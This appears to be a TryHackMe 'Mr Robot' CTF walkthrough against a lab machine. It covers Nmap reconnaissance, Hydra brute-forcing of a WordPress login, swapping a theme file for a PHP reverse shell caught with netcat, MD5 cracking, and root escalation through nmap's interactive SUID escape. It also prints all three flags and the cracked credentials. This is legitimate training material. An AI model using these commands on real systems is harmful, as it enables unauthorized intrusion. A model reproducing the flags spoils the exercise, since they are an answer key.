TryHackMe: Mr Robot CTF Writeup

Target IP: 10.10.231.78 Difficulty: Medium Author: Mohd Faiz
WordPress Hydra John The Ripper SUID Nmap
Phase 1: Reconnaissance & Key 1 [Nmap & Robots.txt]

Start with a standard network enumeration scan using Nmap:

nmap -sC -sV -oN mrrobot_nmap.txt 10.10.231.78

Ports Discovered:

  • 80/tcp - HTTP (Apache httpd)
  • 443/tcp - HTTPS (Apache httpd)

Inspecting Web Directory:

Check the target's robots.txt file directly in the browser or via terminal:

curl http://10.10.231.78/robots.txt

Output:

User-agent: *
fsocity.dic
key-1-of-3.txt

Navigate to http://10.10.231.78/key-1-of-3.txt to recover Key 1. Also download the custom dictionary file fsocity.dic.

Key 1 Flag: 07173f76e81406d22329145f773710db
Phase 2: WordPress Exploitation & Key 2 [Bruteforce & Reverse Shell]

We discover a WordPress login portal running on http://10.10.231.78/wp-login.php.

1. Wordlist Cleaning:

The downloaded dictionary file fsocity.dic contains over 800,000 words with many duplicates. Sort and clean the list:

sort -u fsocity.dic > cleaned_wordlist.txt

2. Username Enumeration:

When entering a random username like admin on WordPress, the error message states "Invalid username". However, testing Elliot gives "The password you entered for the username Elliot is incorrect", confirming Elliot is a valid user!

3. Password Brute-forcing:

Use Hydra to crack Elliot's password using the cleaned wordlist:

hydra -l Elliot -P cleaned_wordlist.txt 10.10.231.78 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

Credentials found: Elliot : ER28-0652

4. Web Shell & Reverse Shell:

  • Log into WordPress Admin dashboard.
  • Navigate to Appearance -> Editor.
  • Select the 404.php template file and replace its contents with a PHP Reverse Shell.
  • Start your Netcat listener: nc -lvnp 4444.
  • Trigger the shell by visiting: http://10.10.231.78/wp-content/themes/twentyfifteen/404.php.

5. Internal Escalation to user robot:

In /home/robot, we find two files: key-2-of-3.txt and password.raw-md5.

cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

Crack the MD5 hash using John the Ripper or CrackStation:

MD5 c3fcd3d76192e4007dfb496cca67e13b -> abcdefghijklmnopqrstuvwxyz

Switch user on the target terminal:

su robot
Password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
Key 2 Flag: 822c73956184f694993bede3e40e200a
Phase 3: Root Escalation & Key 3 [Nmap Interactive SUID]

Search for elevated binaries with SUID permission bits set:

find / -user root -perm -4000 2>/dev/null

Unusual SUID Binary Found:

/usr/local/bin/nmap

Check Nmap version running on target:

/usr/local/bin/nmap --version

Nmap v2.02 is installed. Older versions of Nmap (2.02 to 5.21) feature an interactive mode that allows executing shell commands as the file owner (root)!

Exploitation:

/usr/local/bin/nmap --interactive
nmap> !sh
whoami
root

Retrieve final flag:

cat /root/key-3-of-3.txt
Key 3 Flag: 04a54d72c0a5fa6fe0e7023d21a28186
